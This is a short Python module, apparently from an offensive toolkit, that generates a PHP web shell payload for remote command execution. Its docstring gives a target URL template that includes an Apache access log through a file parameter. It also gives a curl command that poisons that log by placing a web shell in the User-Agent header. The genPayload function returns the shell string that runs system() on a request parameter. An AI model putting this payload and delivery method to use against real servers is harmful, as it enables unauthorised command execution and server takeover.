#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Based on:
Target URL example:  http://<RHOST>:<RPORT>/browse.php?file=/var/log/httpd-access.log&cmd=

Notes:

First you need to deliver the web shell to the target server,
e. g. via log poisoning:
$ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"
"""


def genPayload(cmd):
	"""Just a PHP web shell."""
	return f"<?php system($_GET['{cmd}']); ?>"
